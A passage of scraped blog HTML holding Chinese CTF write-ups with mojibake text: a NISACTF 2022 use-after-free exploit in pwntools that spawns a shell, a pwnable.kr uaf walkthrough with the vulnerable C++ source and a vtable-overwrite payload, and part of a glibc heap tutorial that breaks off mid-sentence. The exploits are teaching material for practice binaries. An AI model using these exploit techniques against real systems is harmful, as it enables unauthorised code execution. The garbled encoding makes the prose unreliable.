gdbè°ƒè¯•å‘ç°æœ€åè°ƒç”¨systemæ˜¯é€šè¿‡call eaxè°ƒç”¨çš„&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;0x8048984 &amp;lt;show+60&amp;gt;    mov    eax, dword ptr [page]         &amp;lt;0x804a060&amp;gt;
0x8048989 &amp;lt;show+65&amp;gt;    mov    eax, dword ptr [eax + 4]
0x804898c &amp;lt;show+68&amp;gt;    mov    edx, dword ptr [page]         &amp;lt;0x804a060&amp;gt;
0x8048992 &amp;lt;show+74&amp;gt;    sub    esp, 0xc
0x8048995 &amp;lt;show+77&amp;gt;    push   edx
0x8048996 &amp;lt;show+78&amp;gt;    call   eax
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä½†æ˜¯eaxçš„å€¼æœ€åæŒ‡å‘[page+0x4]å¤„ï¼Œæ„å‘³ç€æœ€åpayloadæ„é€ éœ€è¦åœ¨system_addrå‰åŠ ä¸Š0x4çš„åç§»&lt;br&gt;
å¦‚ä¸‹å›¾ï¼Œè¿™æ˜¯ä¸åŠ åç§»çš„ç»“æœï¼š&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1678523497501.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
å¯ä»¥æ„é€ åˆæ­¥çš„payloadï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;payload=cyclic(0x4)+p32(NICO_addr)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;åŠ ä¸Šåç§»åè¿˜éœ€è€ƒè™‘ç³»ç»Ÿè°ƒç”¨ä¼ å‚çš„é—®é¢˜ï¼Œæœ¬é¢˜ä¸èƒ½ç›´æ¥åŠ ä¸Šåç§»å°±å®Œäº‹äº†ï¼Œå¦åˆ™åˆä¼šå¦‚ä¸‹å›¾ï¼š&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1678523557372.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
å¯ä»¥çœ‹å‡º0x4çš„åç§»ä½œä¸ºcommandä¼ è¿›systemï¼Œæ‰€ä»¥éœ€è¦ä¿®æ”¹payloadä¸ºï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;payload=b&amp;quot;sh\x00\x00&amp;quot;+p32(NICO_addr)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ‰€ä»¥æœ€åexpï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,os=&#39;linux&#39;,arch=&#39;x86&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./[NISACTF 2022]UAF&amp;quot;)
# io=remote(&amp;quot;1.14.71.254&amp;quot;,28767)
NICO_addr=0x8048642

def create():
    io.recvuntil(b&amp;quot;:&amp;quot;)
    io.sendline(b&amp;quot;1&amp;quot;)

def edit(num):
    io.recvuntil(b&amp;quot;:&amp;quot;)
    io.sendline(b&amp;quot;2&amp;quot;)
    io.recvuntil(b&amp;quot;page\n&amp;quot;)
    io.sendline(str(num))
    io.recvuntil(b&amp;quot;strings\n&amp;quot;)

def dele(num):
    io.recvuntil(b&amp;quot;:&amp;quot;)
    io.sendline(b&amp;quot;3&amp;quot;)
    io.recvuntil(b&amp;quot;page\n&amp;quot;)
    io.sendline(str(num))

def show(num):
    io.recvuntil(b&amp;quot;:&amp;quot;)
    io.sendline(b&amp;quot;4&amp;quot;)
    io.recvuntil(b&amp;quot;page\n&amp;quot;)
    io.sendline(str(num))

create()
dele(0)
create()
edit(1)

gdb.attach(io)
pause()

payload=b&amp;quot;sh\x00\x00&amp;quot;+p32(NICO_addr)
io.sendline(payload)
show(0)
io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">[NISACTF 2022]UAF wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/10qStEKI_/"" data-c="
          &lt;p&gt;æ­¤é¢˜è€ƒå¯Ÿè™šå‡½æ•°å†…å­˜åˆ†é…ä»¥åŠuaf(use after free)&lt;br&gt;
æœ¬é¢˜ç»™å‡º.cppæ–‡ä»¶&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;#include &amp;lt;fcntl.h&amp;gt;
#include &amp;lt;iostream&amp;gt; 
#include &amp;lt;cstring&amp;gt;
#include &amp;lt;cstdlib&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
using namespace std;

class Human{
private:
	virtual void give_shell(){
		system(&amp;quot;/bin/sh&amp;quot;);
	}
protected:
	int age;
	string name;
public:
	virtual void introduce(){
		cout &amp;lt;&amp;lt; &amp;quot;My name is &amp;quot; &amp;lt;&amp;lt; name &amp;lt;&amp;lt; endl;
		cout &amp;lt;&amp;lt; &amp;quot;I am &amp;quot; &amp;lt;&amp;lt; age &amp;lt;&amp;lt; &amp;quot; years old&amp;quot; &amp;lt;&amp;lt; endl;
	}
};

class Man: public Human{
public:
	Man(string name, int age){
		this-&amp;gt;name = name;
		this-&amp;gt;age = age;
        }
        virtual void introduce(){
		Human::introduce();
                cout &amp;lt;&amp;lt; &amp;quot;I am a nice guy!&amp;quot; &amp;lt;&amp;lt; endl;
        }
};

class Woman: public Human{
public:
        Woman(string name, int age){
                this-&amp;gt;name = name;
                this-&amp;gt;age = age;
        }
        virtual void introduce(){
                Human::introduce();
                cout &amp;lt;&amp;lt; &amp;quot;I am a cute girl!&amp;quot; &amp;lt;&amp;lt; endl;
        }
};

int main(int argc, char* argv[]){
	Human* m = new Man(&amp;quot;Jack&amp;quot;, 25);
	Human* w = new Woman(&amp;quot;Jill&amp;quot;, 21);

	size_t len;
	char* data;
	unsigned int op;
	while(1){
		cout &amp;lt;&amp;lt; &amp;quot;1. use\n2. after\n3. free\n&amp;quot;;
		cin &amp;gt;&amp;gt; op;

		switch(op){
			case 1:
				m-&amp;gt;introduce();
				w-&amp;gt;introduce();
				break;
			case 2:
				len = atoi(argv[1]);
				data = new char[len];
				read(open(argv[2], O_RDONLY), data, len);
				cout &amp;lt;&amp;lt; &amp;quot;your data is allocated&amp;quot; &amp;lt;&amp;lt; endl;
				break;
			case 3:
				delete m;
				delete w;
				break;
			default:
				break;
		}
	}

	return 0;	
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æºä»£ç ä¸­ &lt;strong&gt;case3:&lt;/strong&gt; é‡Œé¢freeæ‰äº†må’Œwåå¹¶æœªå°†æŒ‡é’ˆæŒ‡å‘NULLï¼Œå­˜åœ¨æ‚¬å‚æŒ‡é’ˆï¼Œå¯ä»¥æœ‰uafï¼›&lt;br&gt;
uafå³use after freeï¼Œåœ¨æ‚¬å‚æŒ‡é’ˆåï¼Œå†æ¬¡é‡æ–°åˆ†é…å†…å­˜ï¼Œå¯ä»¥é€šè¿‡å„ç§æ–¹å¼æ”¹å†™æ‚¬å‚æŒ‡é’ˆæŒ‡å‘çš„å†…å­˜ç©ºé—´åœ°å€ï¼Œå†æ¬¡è°ƒç”¨è¯¥æŒ‡é’ˆæ—¶ï¼Œå°†å¯èƒ½é€ æˆä¸¥é‡åæœ&lt;br&gt;
è€Œ&lt;code&gt;Man&lt;/code&gt;å’Œ&lt;code&gt;Woman&lt;/code&gt;æ˜¯&lt;code&gt;Human&lt;/code&gt;çš„å­ç±»ï¼Œè™šè¡¨ä¸­å­˜åœ¨çˆ¶ç±»çš„ç§æœ‰è™šå‡½æ•°&lt;code&gt;give_shell()&lt;/code&gt;çš„åœ°å€ï¼Œä½†å¹¶æ²¡æœ‰ç›´æ¥ç»§æ‰¿&lt;code&gt;Human&lt;/code&gt;çš„ç§æœ‰è™šå‡½æ•°&lt;code&gt;give_shell()&lt;/code&gt;ï¼š&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1678375061028.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;äºæ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡å…ˆæ‰¾åˆ°è™šè¡¨ä¸­&#39;give_shell()&#39;çš„åœ°å€ï¼ˆgdbè°ƒè¯•è¿‡ç¨‹ä¸­ä¼šå‡ºç°&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1678376245302.png&#34; alt=&#34;0x401550&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;è°ƒç”¨ &lt;strong&gt;case3:&lt;/strong&gt; åä½¿æŒ‡é’ˆæ‚¬å‚&lt;br&gt;
ç„¶åé€šè¿‡ &lt;strong&gt;case2:&lt;/strong&gt; é‡æ–°åˆ†é…å†…å­˜ï¼Œä¹‹åå†è°ƒç”¨ &lt;strong&gt;case1:&lt;/strong&gt;&lt;br&gt;
&lt;strong&gt;case2:&lt;/strong&gt; è°ƒç”¨ä¸­argv[2]æ˜¯ä»æ–‡ä»¶è¯»å…¥ï¼Œè¯»å…¥é•¿åº¦è·Ÿä¹‹å‰å®šä¹‰&lt;code&gt;Human *m; Human *w&lt;/code&gt;æ—¶åˆ†é…çš„å†…å­˜å¤§å°ç›¸åŒä¸º0x18ï¼Œç¡®ä¿åç»­ä¿®æ”¹å†…å­˜åŒºåŸŸåˆé€‚&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1678376620004.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
å¯ä»¥åœ¨æ­¤å¤„åŠ«æŒ&lt;code&gt;introduce()&lt;/code&gt;ä¸º&lt;code&gt;give_shell()&lt;/code&gt;,ä½†æ˜¯è°ƒç”¨&#39;introduce()&#39;æ—¶è°ƒç”¨çš„æ˜¯è™šå‡½æ•°æŒ‡é’ˆ+0x8å¤„çš„ï¼Œæ‰€ä»¥éœ€è¦å°†åœ°å€-0x8ï¼Œ&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1678376899366.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ä½¿ç”¨&lt;code&gt;python -c &amp;quot;print(&#39;\x68\x15\x40\x00\x00\x00\x00\x00&#39;)&amp;quot; &amp;gt;~/æ–‡æ¡£/pwnable/uaf.txt&lt;/code&gt;æ‰“å°ä¸å¯è§å­—ç¬¦åˆ°æ–‡ä»¶&lt;br&gt;
ä¹‹åå†ä½¿ç”¨&lt;code&gt;./uaf 24 ~/æ–‡æ¡£/pwnable/uaf.txt&lt;/code&gt;ä»æ–‡ä»¶è¯»å…¥24ä¸ªå­—èŠ‚å†…å®¹&lt;br&gt;
æ³¨æ„ &lt;strong&gt;case2:&lt;/strong&gt; éœ€è¦è°ƒç”¨ä¸¤æ¬¡ï¼ŒåŸå› æ˜¯ &lt;strong&gt;case1:&lt;/strong&gt; æœ€å¼€å§‹è°ƒç”¨mï¼Œè€Œ &lt;strong&gt;case3:&lt;/strong&gt; æœ€åfreeçš„æ—¶wï¼Œéœ€é‡æ–°åˆ†é…ä¸¤æ¬¡å†…å­˜ï¼›&lt;br&gt;
æœ€åå¯ä»¥getshellï¼Œpwnable.kr çš„/tmpç›®å½•å¯å†™&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1678378104148.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
">pwnable.kr uaf wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/hIUbdZ-jy/"" data-c="
          &lt;p&gt;å‚è€ƒï¼š&lt;a href=&#34;https://www.yuque.com/cyberangel/rg9gdm/uhdudz#y9ecP&#34;&gt;cyberangel&lt;/a&gt;&lt;br&gt;
ä¸æ ˆç”±é«˜åœ°å€å‘åœ°å€å€¼å¢é•¿ä¸åŒï¼Œå †ç”±åœ°å€å€¼å‘é«˜åœ°å€å¢é•¿ï¼Œå¦‚å›¾ï¼š&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1678358275700.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
heapåœ¨å‡½æ•°è°ƒç”¨mallocï¼ˆbrkå¢åŠ ï¼‰ä¹‹åæ‰ä¼šè¢«åˆ†é…&lt;br&gt;
å †å†…å­˜ç®¡ç†çš„ä¸¤ç§ç³»ç»Ÿè°ƒç”¨ï¼š&lt;code&gt;(s)brk&lt;/code&gt;å’Œ&lt;code&gt;mmap&lt;/code&gt;&lt;br&gt;
&lt;code&gt;(s)brk&lt;/code&gt;é€šè¿‡æ”¹å˜ç¨‹åºé—´æ–­ç‚¹ä½ç½®ï¼Œä»è€Œæ”¹å˜æ•°æ®æ®µé•¿åº¦ï¼Œæ¥åˆ†é…å†…å­˜&lt;br&gt;
&lt;code&gt;mmap&lt;/code&gt;é€šè¿‡åœ¨å †å’Œæ ˆä¹‹é—´æ‰¾çš„ä¸€æ®µç©ºé—²å†…å­˜åˆ†é…ï¼Œå¹¶åˆå§‹åŒ–ä¸º0&lt;br&gt;
å½“ç”¨æˆ·ç”³è¯·ä¸€æ®µå¤§äº128kbçš„å†…å­˜æ—¶é€‰æ‹©&lt;code&gt;mmap&lt;/code&gt;è€Œä¸æ˜¯&lt;code&gt;(s)brk&lt;/code&gt;,&lt;br&gt;
&lt;a href=&#34;https://zhuanlan.zhihu.com/p/311527161&#34;&gt;zhihu&lt;/a&gt;&lt;br&gt;
åŒç†ï¼Œå½“ç©ºé—²å†…å­˜è¿‡å¤šæ—¶&lt;code&gt;(s)brk&lt;/code&gt;ä¹Ÿä¼šé€šè¿‡æ”¹å˜è‡ªå·±æŒ‡å‘çš„åœ°å€ä»¥ç¼©å‡ç©ºä½™å†…å­˜&lt;br&gt;
å†…å­˜åˆ†é…æœ‰ä»¥ä¸‹ç‰¹ç‚¹ï¼š&lt;br&gt;
1.å…·æœ‰é•¿ç”Ÿå‘½å‘¨æœŸçš„å¤§å†…å­˜åˆ†é…ä½¿ç”¨mmap&lt;br&gt;
2.ç‰¹åˆ«å¤§çš„å†…å­˜åˆ†é…ä½¿ç”¨mmap&lt;br&gt;
3.å…·æœ‰çŸ­ç”Ÿå‘½å‘¨æœŸçš„å†…å­˜åˆ†é…ä½¿ç”¨(s)brk&lt;br&gt;
4.å°½é‡åªç¼“å­˜ä¸´æ—¶ä½¿ç”¨çš„ç©ºé—²å°å†…å­˜å¿«ï¼Œå¯¹å¤§å†…å­˜å—æˆ–æ˜¯é•¿ç”Ÿå‘½å‘¨æœŸçš„å¤§å†…å­˜å—åœ¨é‡Šæ”¾æ—¶éƒ½ç›´æ¥å½’è¿˜ç»™æ“ä½œç³»ç»Ÿ&lt;br&gt;
5.å¯¹ç©ºé—²çš„å°å†…å­˜å—åªä¼šåœ¨mallocå’Œfreeçš„æ—¶å€™è¿›è¡Œåˆå¹¶ï¼Œfreeæ—¶ç©ºé—²å†…å­˜å—å¯èƒ½æ”¾å…¥å†…å­˜æ± ä¸­ï¼Œä¸ä¸€å®šå½’è¿˜ç»™æ“ä½œç³»ç»Ÿ&lt;br&gt;
6.æ”¶ç¼©å †çš„æ¡ä»¶æ—¶å½“å‰freeçš„å—å¤§å°åŠ ä¸Šå‰åèƒ½åˆå¹¶çš„chunkçš„å¤§å°å¤§äº64kï¼Œå¹¶ä¸”å †é¡¶å¤§å°è¾¾åˆ°é˜ˆå€¼ï¼Œæ‰æœ‰å¯èƒ½æ”¶ç¼©å †ï¼ŒæŠŠå †æœ€é¡¶ç«¯çš„ç©ºé—²å†…å­˜è¿”å›ç»™æ“ä½œç³»ç»Ÿ&lt;/p&gt;
&lt;p&gt;ä¸»çº¿ç¨‹é¦–æ¬¡è°ƒç”¨mallocåˆ†é…çš„å†…å­˜ä¹Ÿå«åšmain arenaï¼Œéä¸»çº¿ç¨‹mallocæ—¶äº§ç”Ÿthread arena&lt;br&gt;
å¦‚æœmain arenaå†…å­˜æ—¶é€šè¿‡mmapå‘ç³»ç»Ÿåˆ†é…çš„ï¼Œfreeæ—¶ä¼šç›´æ¥è°ƒç”¨munmapå°†è¯¥å†…å­˜å½’è¿˜ç»™ç³»ç»Ÿ&lt;br&gt;
è€Œfreeè°ƒç”¨ä¹‹åä¸ä»…ä¼šæ¸…ç©ºå †å—çš„user dataï¼Œè¿˜ä¼šå°†æŒ‡å‘è¯¥å †å—çš„æŒ‡é’ˆå­˜å‚¨åˆ°main_arenaä¸­ï¼ˆæˆ–æ˜¯fastbinï¼Œæ³¨æ„æŒ‡é’ˆå’Œåœ°å€åŒºåˆ«å¼€ï¼Œåœ°å€å­˜æ”¾çš„æŒ‡é’ˆï¼Œ64ä½æŒ‡é’ˆ8å­—èŠ‚ï¼Œä¸€ä¸ª arena é¡¶éƒ¨çš„ chunk å«åš Top chunkï¼Œå®ƒä¸å±äºä»»ä½• binã€‚å½“æ‰€æœ‰ bin ä¸­éƒ½æ²¡æœ‰ç©ºé—²çš„å¯ç”¨ chunk æ—¶ï¼Œæˆ‘ä»¬åˆ‡å‰² Top chunk æ¥æ»¡è¶³ç”¨æˆ·çš„å†…å­˜ç”³è¯·ã€‚å‡è®¾ Top chunk å½“å‰å¤§å°ä¸º N å­—èŠ‚ï¼Œç”¨æˆ·ç”³è¯·äº† K å­—èŠ‚çš„å†…å­˜ï¼Œé‚£ä¹ˆ Top chunk å°†è¢«åˆ‡å‰²ä¸ºï¼š&lt;/p&gt;
&lt;p&gt;ä¸€ä¸ª K å­—èŠ‚çš„ chunkï¼Œåˆ†é…ç»™ç”¨æˆ·&lt;br&gt;
ä¸€ä¸ª N-K å­—èŠ‚çš„ chunkï¼Œç§°ä¸º Last Remainder chunk&lt;br&gt;
åè€…æˆä¸ºæ–°çš„ Top chunkã€‚å¦‚æœè¿ Top chunk éƒ½ä¸å¤Ÿç”¨äº†ï¼Œé‚£ä¹ˆï¼š&lt;/p&gt;
&lt;p&gt;åœ¨ main_arena ä¸­ï¼Œç”¨ brk() æ‰©å¼  Top chunk&lt;br&gt;
åœ¨ non_main_arena ä¸­ï¼Œç”¨ mmap() åˆ†é…æ–°çš„å †&lt;/p&gt;
&lt;p&gt;å¯¹äºå †ä¸­æœ€å°å†…å­˜ç®¡ç†å•ä½ï¼Œchunkæ¥è¯´ï¼Œåˆ†ä¸ºallocated chunkï¼Œfree chunkï¼Œtop chunkï¼ŒLast remainder chunkå››ç§chunkï¼Œä½†åˆå¯ä»¥åˆ†ä¸ºallocated chunkå’Œfree chunkä¸¤ç§ï¼Œæ— è®ºä¸€ä¸ª chunk çš„å¤§å°å¦‚ä½•ï¼Œå¤„äºåˆ†é…çŠ¶æ€è¿˜æ˜¯é‡Šæ”¾çŠ¶æ€ï¼Œå®ƒä»¬éƒ½ä½¿ç”¨ä¸€ä¸ªç»Ÿä¸€çš„ç»“æ„&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;/*
  This struct declaration is misleading (but accurate and necessary).
  It declares a &amp;quot;view&amp;quot; into memory allowing access to necessary
  fields at known offsets from a given base. See explanation below.
*/
struct malloc_chunk {

  INTERNAL_SIZE_T      prev_size;  /* Size of previous chunk (if free).  */
  INTERNAL_SIZE_T      size;       /* Size in bytes, including overhead. */

  struct malloc_chunk* fd;         /* double links -- used only if free. */
  struct malloc_chunk* bk;

  /* Only used for large blocks: pointer to next larger size.  */
  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
  struct malloc_chunk* bk_nextsize;
};
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;allocated chunkï¼š&lt;br&gt;
allocated chunckå°±æ˜¯å·²ç»åˆ†é…ç»™ç”¨æˆ·çš„ chunkï¼Œå…¶å›¾ç¤ºå¦‚ä¸‹ï¼š&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1678636230575.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;chunkï¼šè¯¥ Allocated chunk çš„èµ·å§‹åœ°å€ï¼›
memï¼šè¯¥ Allocated chunk ä¸­ç”¨æˆ·å¯ç”¨åŒºåŸŸçš„èµ·å§‹åœ°å€ï¼ˆ= chunk + sizeof(malloc_chunk)ï¼‰ï¼›
next_chunkï¼šä¸‹ä¸€ä¸ª chunckï¼ˆæ— è®ºç±»å‹ï¼‰çš„èµ·å§‹åœ°å€ã€‚
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;åœ¨å›¾ä¸­ï¼Œchunk æŒ‡é’ˆæŒ‡å‘ä¸€ä¸ª chunk çš„å¼€å§‹ï¼Œä¸€ä¸ª chunk ä¸­åŒ…å«äº†ç”¨æˆ·è¯·æ±‚çš„å†…å­˜åŒºåŸŸå’Œç›¸å…³çš„æ§åˆ¶ä¿¡æ¯ã€‚å›¾ä¸­çš„ mem æŒ‡é’ˆæ‰æ˜¯çœŸæ­£è¿”å›ç»™ç”¨æˆ·çš„å†…å­˜æŒ‡é’ˆã€‚chunk çš„ç¬¬äºŒä¸ªåŸŸçš„æœ€ä½ä¸€ä½ä¸º Pï¼Œå®ƒè¡¨ç¤ºå‰ä¸€ä¸ªå—æ˜¯å¦åœ¨ä½¿ç”¨ä¸­ï¼ŒP ä¸º 0 åˆ™è¡¨ç¤ºå‰ä¸€ä¸ª chunk ä¸ºç©ºé—²ï¼Œè¿™æ—¶chunk çš„ç¬¬ä¸€ä¸ªåŸŸ prev_size æ‰æœ‰æ•ˆï¼Œprev_size è¡¨ç¤ºå‰ä¸€ä¸ª chunk çš„ sizeï¼Œç¨‹åºå¯ä»¥ä½¿ç”¨è¿™ä¸ªå€¼æ¥æ‰¾åˆ°å‰ä¸€ä¸ª chunk çš„å¼€å§‹åœ°å€ã€‚å½“ P ä¸º 1 æ—¶ï¼Œè¡¨ç¤ºå‰ä¸€ä¸ª chunk æ­£åœ¨ä½¿ç”¨ä¸­ï¼Œprev_sizeæ— æ•ˆï¼Œç¨‹åºä¹Ÿå°±ä¸å¯ä»¥å¾—åˆ°å‰ä¸€ä¸ªchunkçš„å¤§å°ã€‚ä¸èƒ½å¯¹å‰ä¸€ä¸ªchunkè¿›è¡Œä»»ä½•æ“ä½œã€‚ptmallocåˆ†é…çš„ç¬¬ä¸€ä¸ªå—æ€»æ˜¯å°† P è®¾ä¸º 1ï¼Œä»¥é˜²æ­¢ç¨‹åºå¼•ç”¨åˆ°ä¸å­˜åœ¨çš„åŒºåŸŸã€‚&lt;br&gt;
Chunk çš„ç¬¬äºŒä¸ªåŸŸçš„å€’æ•°ç¬¬äºŒä¸ªä½ä¸º Mï¼Œä»–è¡¨ç¤ºå½“å‰ chunk æ˜¯ä»å“ªä¸ªå†…å­˜åŒºåŸŸè·å¾—çš„è™šæ‹Ÿå†…å­˜ã€‚M ä¸º 1 è¡¨ç¤ºè¯¥ chunk æ˜¯ä» mmap æ˜ å°„åŒºåŸŸåˆ†é…çš„ï¼Œå¦åˆ™æ˜¯ä» heap åŒºåŸŸåˆ†é…çš„ã€‚Chunk çš„ç¬¬äºŒä¸ªåŸŸå€’æ•°ç¬¬ä¸‰ä¸ªä½ä¸º Aï¼Œè¡¨ç¤ºè¯¥ chunk å±äºä¸»åˆ†é…åŒºæˆ–è€…éä¸»åˆ†é…åŒºï¼Œå¦‚æœå±äºéä¸»åˆ†é…åŒºï¼Œå°†è¯¥ä½ç½®ä¸º 1ï¼Œå¦åˆ™ç½®ä¸º 0ã€‚&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;free chunkï¼š&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1678636331695.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;prev_size: ä¸¤ä¸ªç›¸é‚» free chunk ä¼šè¢«åˆå¹¶æˆä¸€ä¸ªï¼Œå› æ­¤è¯¥å­—æ®µæ€»æ˜¯ä¿å­˜å‰ä¸€ä¸ª allocated chunk çš„ç”¨æˆ·æ•°æ®ï¼›
size: è¯¥å­—æ®µä¿å­˜æœ¬ free chunk çš„å¤§å°ï¼›
fd: Forward pointer â€”â€” æœ¬å­—æ®µæŒ‡å‘åŒä¸€ bin ä¸­çš„ä¸‹ä¸ª free chunkï¼ˆfree chunk é“¾è¡¨çš„å‰é©±æŒ‡é’ˆï¼‰ï¼›
bk: Backward pointer â€”â€” æœ¬å­—æ®µæŒ‡å‘åŒä¸€ bin ä¸­çš„ä¸Šä¸ª free chunkï¼ˆfree chunk é“¾è¡¨çš„åç»§æŒ‡é’ˆï¼‰ã€‚
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å½“ chunk ç©ºé—²æ—¶ï¼Œå…¶ M çŠ¶æ€ä¸å­˜åœ¨ï¼Œåªæœ‰ AP çŠ¶æ€ï¼ŒåŸæœ¬æ˜¯ç”¨æˆ·æ•°æ®åŒºçš„åœ°æ–¹å­˜å‚¨äº†å››ä¸ªæŒ‡é’ˆï¼ŒæŒ‡é’ˆ fd æŒ‡å‘åä¸€ä¸ªç©ºé—²çš„ chunkï¼Œè€Œ bk æŒ‡å‘å‰ä¸€ä¸ªç©ºé—²çš„ chunkï¼Œptmalloc é€šè¿‡è¿™ä¸¤ä¸ªæŒ‡é’ˆå°†å¤§å°ç›¸è¿‘çš„ chunk è¿æˆä¸€ä¸ªåŒå‘é“¾è¡¨ã€‚å¯¹äº large bin ä¸­çš„ç©ºé—² chunkï¼Œè¿˜æœ‰ä¸¤ä¸ªæŒ‡é’ˆï¼Œfd_nextsize å’Œ bk_nextsizeï¼Œè¿™ä¸¤ä¸ªæŒ‡é’ˆç”¨äºåŠ å¿«åœ¨ large bin ä¸­æŸ¥æ‰¾æœ€è¿‘åŒ¹é…çš„ç©ºé—²chunkã€‚ä¸åŒçš„ chunk é“¾è¡¨åˆæ˜¯é€šè¿‡ bins æˆ–è€… fastbins æ¥ç»„ç»‡çš„&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;bin:&lt;br&gt;
ç”¨æˆ·é‡Šæ”¾æ‰çš„ chunk ä¸ä¼šé©¬ä¸Šå½’è¿˜ç»™ç³»ç»Ÿï¼Œptmalloc ä¼šç»Ÿä¸€ç®¡ç† heap å’Œ mmap æ˜ å°„åŒºåŸŸä¸­çš„ç©ºé—²çš„ chunkã€‚å½“ç”¨æˆ·å†ä¸€æ¬¡è¯·æ±‚åˆ†é…å†…å­˜æ—¶ï¼Œptmalloc åˆ†é…å™¨ä¼šè¯•å›¾åœ¨ç©ºé—²çš„ chunk ä¸­æŒ‘é€‰ä¸€å—åˆé€‚çš„ç»™ç”¨æˆ·ã€‚è¿™æ ·å¯ä»¥é¿å…é¢‘ç¹çš„ç³»ç»Ÿè°ƒç”¨ï¼Œé™ä½å†…å­˜åˆ†é…çš„å¼€é”€ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ptmalloc å°†ç›¸ä¼¼å¤§å°çš„ chunk ç”¨åŒå‘é“¾è¡¨é“¾æ¥èµ·æ¥ï¼Œè¿™æ ·çš„ä¸€ä¸ªé“¾è¡¨è¢«ç§°ä¸ºä¸€ä¸ª binã€‚Ptmalloc ä¸€å…± ç»´æŠ¤äº† 128 ä¸ª binï¼Œå¹¶ä½¿ç”¨ä¸€ä¸ªæ•°ç»„æ¥å­˜å‚¨è¿™äº› bin&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1679211420803.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1678637134787.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;fastbin:&lt;br&gt;
å…±æœ‰10ä¸ªfastbin&lt;br&gt;
ç®¡ç† 16ã€24ã€32ã€40ã€48ã€56ã€64 Bytes çš„ free chunksï¼ˆ32ä½ä¸‹é»˜è®¤ï¼‰&lt;br&gt;
å…¶ä¸­çš„ chunk çš„ in_use ä½ï¼ˆä¸‹ä¸€ä¸ªç‰©ç†ç›¸é‚»çš„ chunk çš„ P ä½ï¼‰æ€»ä¸º1&lt;br&gt;
å½“ç”¨æˆ·ç”³è¯·ä¸€ä¸ªå°äºç­‰äº64bytesçš„ç©ºé—´æ—¶ä¼šé¦–å…ˆæ£€æŸ¥å¯¹åº”å¤§å°çš„fastbinä¸­æ˜¯å¦åŒ…å«æœªè¢«ä½¿ç”¨çš„chunkï¼Œå¦‚æœå­˜åœ¨åˆ™ç›´æ¥å°†å…¶ä»fastbinä¸­ç§»é™¤å¹¶è¿”å›ï¼›å¦åˆ™é€šè¿‡å…¶ä»–æ–¹å¼ï¼ˆå‰ªåˆ‡top chunkï¼‰å¾—åˆ°ä¸€å—ç¬¦åˆå¤§å°è¦æ±‚çš„chunkå¹¶è¿”å›&lt;/p&gt;
&lt;p&gt;small binï¼š&lt;br&gt;
å¦‚æœç¨‹åºè¯·æ±‚çš„å†…å­˜èŒƒå›´ä¸åœ¨ fast bin çš„èŒƒå›´å†…ï¼Œå°±ä¼šè€ƒè™‘ small binã€‚ç®€å•ç‚¹è¯´å°±æ˜¯å¤§äº 80 Bytes å°äºæŸä¸€ä¸ªå€¼æ—¶ï¼Œå°±ä¼šé€‰æ‹©å®ƒã€‚&lt;/p&gt;
&lt;p&gt;unsorted binï¼š&lt;br&gt;
